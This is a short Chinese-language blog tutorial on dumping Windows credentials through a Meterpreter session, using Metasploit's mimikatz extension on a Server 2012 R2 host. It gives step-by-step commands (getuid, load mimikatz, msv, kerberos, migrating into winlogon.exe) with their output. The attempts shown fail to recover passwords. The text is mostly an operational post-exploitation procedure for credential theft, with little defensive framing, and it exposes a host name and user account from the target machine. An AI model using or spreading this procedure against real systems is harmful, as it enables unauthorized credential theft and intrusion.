Meterpreter会话读取密码

نُشر في 2020-10-12 عُدل في 2020-10-19

注意事项：
mimikatz模块的使用需要Administrator权限或者System权限。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。但是在32位系统下则没有这个限制。

准备：
本次我们是在64位系统上进行试验meterpreter读取密码

C:\Windows\system32>systeminfo
systeminfo

Host Name: DELL-R330
OS Name: Microsoft Windows Server 2012 R2 Standard
OS Version: 6.3.9600 N/A Build 9600
OS Manufacturer: Microsoft Corporation
OS Configuration: Standalone Server
OS Build Type: Multiprocessor Free
Registered Owner: Windows User
Registered Organization:
Product ID: 00252-60020-02259-AA300
Original Install Date: 7/22/2017, 2:11:09 AM
System Boot Time: 7/31/2020, 3:09:53 PM
System Manufacturer: Dell Inc.
System Model: PowerEdge R330
System Type: x64-based PC
Processor(s): 1 Processor(s) Installed.
[01]: Intel64 Family 6 Model 94 Stepping 3 GenuineIntel ~800 Mhz

第一步：首先要获得系统权限或者是管理员权限

C:\Windows\system32>whoami

whoami

nt authority\system


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

第二步：加载mimikatz工具模块

注意：MSF加载默认使用的32位，如果是64位系统需要尽心改动

meterpreter > load mimikatz

Loading extension mimikatz…[!] Loaded x86 Mimikatz on an x64 architecture.

[!] Loaded Mimikatz on a newer OS (Windows 2012 R2 (6.3 Build 9600).). Did you mean to ‘load kiwi’ instead?
Success.

第三步：获取登陆密码的hash值

meterpreter > msv

Running as SYSTEM
Retrieving msv credentials
msv credentials

AuthID Package Domain User Password

6;563049472 NTLM DELL-R330 ittbbs mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;798145 Negotiate IIS APPPOOL DefaultAppPool

第四步：获取明文密码

meterpreter > kerberos

[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials

AuthID Package Domain User Password

6;563049472 NTLM DELL-R330 ittbbs mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (kerberos KO)

我们发现无法读取到hash值，这个时候我们把进程迁移到64位进程中试试

第五步：PS查找迁移进程

2660 5764 winlogon.exe x64 3 NT AUTHORITY\SYSTEM C:\Windows\System32\winlogon.exe

meterpreter > migrate 2660

[] Migrating from 6620 to 2660…
[] Migration completed successfully.

meterpreter > msv

[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials

6;563049472 NTLM DELL-R330 ittbbs n.a. (msv1_0 KO)

无法读取密码，说明并不是所有的密码都可以读取，存在一定的条件
